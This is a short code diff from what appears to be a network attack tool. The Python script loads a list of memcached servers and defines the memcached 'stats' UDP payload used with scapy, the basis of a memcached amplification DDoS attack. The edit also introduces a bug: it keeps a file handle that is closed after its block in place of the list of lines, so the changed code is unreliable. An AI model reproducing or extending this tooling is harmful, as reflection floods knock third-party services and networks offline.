@@ -1,12 +1,12 @@
-# Import modules
 import random
+from pathlib import Path
 
 from colorama import Fore
 from scapy.all import IP, UDP, Raw, send
 
 # Load MEMCACHED servers list
-with open("impulse/L4/memcached_servers.txt") as f:
-    memcached_servers = f.readlines()
+with Path("impulse/L4/memcached_servers.txt").open() as f:
+    memcached_servers = f
 
 # Payload
 payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
